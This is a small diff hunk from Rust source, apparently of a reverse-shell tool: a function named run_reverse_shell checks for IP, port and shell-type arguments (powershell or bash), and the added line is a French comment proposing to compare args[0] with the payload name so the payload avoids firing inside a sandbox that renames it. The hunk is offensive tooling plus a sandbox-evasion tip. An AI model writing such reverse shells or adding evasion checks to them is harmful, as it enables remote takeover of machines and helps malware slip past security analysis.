@@ -11,6 +11,7 @@ pub fn run_reverse_shell() {
     // Vérifier si on a les 3 arguments nécessaires : IP, port et type de shell
     if args.len() != 4 {
         eprintln!("Usage: {} <ip> <port> <shell_type>", args[0]);
+// On peut rajouter un check entre args[0] et le nom du payload pour eviter un déclenchement dans une sandbox (qui rename le nom)
         eprintln!("shell_type: powershell | bash");
         return;
     }
